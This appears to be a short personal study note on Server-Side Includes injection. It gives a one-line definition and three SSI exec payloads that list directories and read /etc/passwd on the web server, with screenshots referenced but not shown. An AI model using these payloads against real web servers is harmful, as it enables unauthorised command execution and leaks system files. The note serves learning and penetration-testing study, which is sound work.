[[Other-Injections]]
[Youtube](https://www.youtube.com/watch?v=GMSix1a1Mi0)

# Server-Side Includes (SSI) Injection
- SSI Injection is a server-side exploit technique that allows an attacker to send code into a web application, which will later be executed locally by the web server.


## Workflow
1. ![[Pasted image 20201211005339.png]]![[Pasted image 20201211005401.png]]
2.  `<!-- #exec cmd="/bin/ls /"-->`
	1.  ![[Pasted image 20201211005521.png]]
	2.  ![[Pasted image 20201211005542.png]]
3.  `<!-- #exec cmd="ls "-->`
	1.  ![[Pasted image 20201211005630.png]]
	2.  ![[Pasted image 20201211005644.png]]
4.  `<!-- #exec cmd="cat /etc/passwd "-->`
	1.  ![[Pasted image 20201211010212.png]]
	2.  ![[Pasted image 20201211010224.png]]